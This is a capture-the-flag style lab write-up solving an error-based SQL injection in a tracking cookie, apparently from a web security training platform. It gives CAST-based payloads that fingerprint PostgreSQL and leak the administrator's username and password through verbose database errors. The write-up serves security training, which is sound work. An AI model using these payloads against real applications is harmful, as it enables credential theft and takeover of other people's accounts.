# Lab: Visible error-based SQL injection

### Instructions

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account. 

### Solution

Intercepting a request to view details on an item in the shop in Burp, we can add a single quote character to the `TrackingId` field to cause the app to throw a verbose error:

`Cookie: TrackingId=JFXnziAAi9vQFwfP'`

error message:

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'JFXnziAAi9vQFwfP''. Expected  char
```

Because this error is so verbose, we can use `CAST()` to attempt to convert the administrator password into an integer, which will fail, but the error message will reveal the actual password string as it errors while trying to convert to int.

Trying a few different payloads we can determine this app is using a PostgreSQL DB:

```sql
Cookie: TrackingId=' AND 1=CAST((SELECT version()) AS int)--
```

Which returns:

```
ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
```

We know from the instructions there is a `users` table with `username` and `password` columns. 

We can query the first entry in the `username` column:

```sql
TrackingId=' AND 1=CAST((SELECT username from users LIMIT 1) AS int)--
```

Which returns:

```
ERROR: invalid input syntax for type integer: "administrator"
```

As well as the password column:

```sql
TrackingId=' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--
```

Which gives us the administrator password:

```
ERROR: invalid input syntax for type integer: "vyrjut10rdwmdcsqko0m"
```

This can be used to login as the administrator, solving the lab.

